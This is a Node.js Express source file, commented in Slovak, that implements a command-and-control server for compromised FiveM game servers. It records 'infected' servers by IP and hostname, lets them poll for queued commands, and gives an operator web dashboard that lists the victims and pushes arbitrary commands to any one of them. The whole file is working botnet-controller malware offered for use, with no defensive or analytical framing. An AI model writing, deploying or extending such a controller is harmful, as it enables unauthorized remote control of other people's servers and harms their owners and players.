const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(express.json());
app.use(cors());

// Statické súbory
const frontendPath = path.join(__dirname, 'frontend'); 
app.use(express.static(frontendPath));

let infectedServers = []; 
let serverCommands = {}; // Tu sa budú ukladať príkazy čakajúce na vykonanie (podľa IP)

// --- ENDPOINTY PRE FIVEM SERVER ---

// 1. Prijímanie reportu zo servera
app.post('/api/report', (req, res) => {
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();

    const newServer = {
        ip: cleanIp,
        hostname: req.body.hostname || "Neznámy Server",
        players: req.body.players || 0,
        lastSeen: new Date().toLocaleTimeString('sk-SK')
    };

    const index = infectedServers.findIndex(s => s.ip === newServer.ip);
    if (index > -1) { 
        infectedServers[index] = newServer; 
    } else { 
        infectedServers.push(newServer); 
    }
    
    res.status(200).send({ status: "ok" });
});

// 2. FiveM server si tadiaľto sťahuje príkazy (Polling)
app.get('/api/get-commands', (req, res) => {
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();
    
    // Ak sú pre túto IP nejaké príkazy, pošleme ich a hneď vymažeme z fronty
    const cmds = serverCommands[cleanIp] || [];
    serverCommands[cleanIp] = []; 
    
    res.json(cmds);
});


// --- ENDPOINTY PRE WEB DASHBOARD ---

// 3. Zoznam serverov pre hlavnú stránku
app.get('/api/list', (req, res) => {
    res.json(infectedServers);
});

// 4. Odoslanie príkazu z webu do fronty
app.post('/api/send-command', (req, res) => {
    const { ip, command } = req.body;
    
    if (!ip || !command) {
        return res.status(400).send({ error: "Chýba IP alebo príkaz" });
    }

    if (!serverCommands[ip]) {
        serverCommands[ip] = [];
    }

    serverCommands[ip].push(command);
    console.log(`[C2] Príkaz "${command}" pridaný do fronty pre IP: ${ip}`);
    
    res.json({ status: "queued", command: command });
});


// --- OBSLUHA STRÁNOK ---

app.get('/', (req, res) => {
    res.sendFile(path.join(frontendPath, 'index.html'));
});

app.get('/manage', (req, res) => {
    res.sendFile(path.join(frontendPath, 'manage.html'));
});

const PORT = process.env.PORT || 10000; 
app.listen(PORT, '0.0.0.0', () => {
    console.log(`C2 Server beží na porte ${PORT}`);
});